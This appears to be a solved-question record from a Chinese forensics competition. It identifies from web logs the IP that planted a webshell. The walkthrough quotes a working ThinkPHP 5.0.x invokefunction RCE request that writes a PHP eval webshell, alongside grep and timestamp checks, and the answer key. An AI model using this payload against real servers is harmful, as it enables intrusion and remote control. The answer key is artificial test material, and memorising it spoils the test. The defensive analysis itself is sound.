meta:
  competition: "2025pinghang"
  question_id: "S11"
  category: "S_server"
  short_name: "上传木马的攻击者 IP"
  difficulty: "medium"
  status: "solved"
  confidence: "high"
question:
  raw: "分析网站日志，成功在网站后台上传木马的攻击者 IP 是多少（格式：1.1.1.1）"
answer:
  value: "222.2.2.2"
  format_note: "外网 IP，通过 ThinkPHP 5 RCE 漏洞写入 webshell"
walkthrough:
  identify: "/www/wwwlogs/www.tpshop.com.log 中含 webshell 写入痕迹"
  extract: |
    grep -E 'invokefunction|file_put_contents|peiqi' /www/wwwlogs/www.tpshop.com.log
  analyze: |
    2022-03-04 15:15:13 222.2.2.2 GET /?s=/admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=peiqi.php&vars[1][]=<?php @eval($_POST['peiqi'])?>
    → ThinkPHP 5.0.x invokefunction RCE 漏洞，将 <?php @eval($_POST['peiqi'])?> 写入网站根目录 peiqi.php。
    该 IP 之后持续向 /peiqi.php 发送 POST，长期控制服务器。
  verify: |
    peiqi.php birth time = 2022-03-04 15:15:13.781878758 与 RCE 攻击日志同秒匹配。
    Host header 222.2.2.180 → 攻击者反代/伪装 host。
  command: |
    sudo grep -E 'peiqi|invokefunction' /mnt/server/www/wwwlogs/www.tpshop.com.log | head
integrity:
  source: "/www/wwwlogs/www.tpshop.com.log + peiqi.php birth time"
  external_access: false
  tools: ["grep", "stat"]
  artifacts:
    - "cases/2025平航杯/artifacts/s_recon7.sh"
notes: |
  题目说"网站后台上传"——但实际是 ThinkPHP RCE 漏洞 file_put_contents（未经登录后台）。
  题意宽泛理解为"网站服务"，222.2.2.2 是唯一通过 web 成功植入木马的 IP。
